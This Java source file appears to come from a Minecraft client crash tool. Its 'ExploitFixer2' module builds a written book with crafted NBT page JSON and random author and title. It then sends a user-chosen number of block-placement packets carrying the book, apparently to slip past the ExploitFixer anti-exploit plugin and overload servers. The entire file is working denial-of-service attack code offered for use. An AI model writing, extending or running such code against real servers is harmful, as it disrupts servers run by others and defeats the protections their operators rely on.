package dev.isnow.puppy.exploit.impl.nbt;

import dev.isnow.puppy.exception.ExploitException;
import dev.isnow.puppy.exploit.Exploit;
import dev.isnow.puppy.exploit.ExploitInfo;
import dev.isnow.puppy.exploit.ExploitType;
import dev.isnow.puppy.exploit.argument.Argument;
import dev.isnow.puppy.helper.ChatHelper;
import dev.isnow.puppy.helper.NetHelper;
import dev.isnow.puppy.holder.ExploitHolder;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import org.apache.commons.lang3.RandomStringUtils;

@ExploitInfo(
    name = "ExploitFixer2",
    type = ExploitType.NBT,
    usage = ".exploit exploitfixer2",
    description = "Use if exploitfixer doesnt work"
)
public class ExploitFixer2Exploit extends Exploit<ItemStack> {

    public ExploitFixer2Exploit() {
        super(() -> {
                    ItemStack itemStack = new ItemStack(Items.written_book);
                    NBTTagCompound compound = new NBTTagCompound();

                    NBTTagList pages = new NBTTagList();
                    pages.appendTag(new NBTTagString(ExploitHolder.getExtraJson()));

                    compound.setString("author", RandomStringUtils.randomAlphabetic(10));
                    compound.setString("title", RandomStringUtils.randomAlphabetic(10));
                    compound.setByte("resolved", (byte) 1);
                    compound.setTag("pages", pages);

                    itemStack.setTagCompound(compound);

                    return itemStack;
                },
                new Argument("packets", 0, Integer.class));
    }

    @Override
    public void execute(Object... args) throws ExploitException {
        long start = System.currentTimeMillis();
        int packets = (int) args[0];

        ChatHelper.printMessage(
                String.format("Sending &8[&7Method: &7%s&7, Packets: &7%s&8]", getName(), args[0]));
        for (int i = 0; i < packets; i++) {
            NetHelper.sendPacket(new C08PacketPlayerBlockPlacement(exploitSource().get()));
        }
        ChatHelper.printMessage(String.format("Sent &8[&7Method: &7%s&7, Time: &7%sms&8]", getName(),
                System.currentTimeMillis() - start));
    }
}
